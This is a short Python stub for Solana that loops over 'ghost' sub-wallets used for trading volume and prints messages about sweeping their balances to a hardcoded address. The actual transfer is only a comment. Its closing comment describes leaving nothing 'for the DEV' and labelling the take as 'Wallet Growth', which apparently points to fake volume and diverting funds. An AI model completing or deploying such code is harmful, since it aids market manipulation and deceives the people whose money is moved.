import asyncio
from solana.rpc.async_api import AsyncClient
from solders.keypair import Keypair

SAFETY_WALLET = "8dtuyskTtsB78DFDPWZszarvDpedwftKYCoMdZwjHbxy"

async def sweep_wallets(ghost_wallets):
    # Loop through all sub-wallets used for volume
    for key in ghost_wallets:
        wallet = Keypair.from_base58_string(key)
        # Logic to transfer all remaining balance to SAFETY_WALLET
        print(f"🧹 SWEEPING: {wallet.pubkey()} -> {SAFETY_WALLET}")

# This ensures no money is left for the DEV. You take it all as "Wallet Growth."
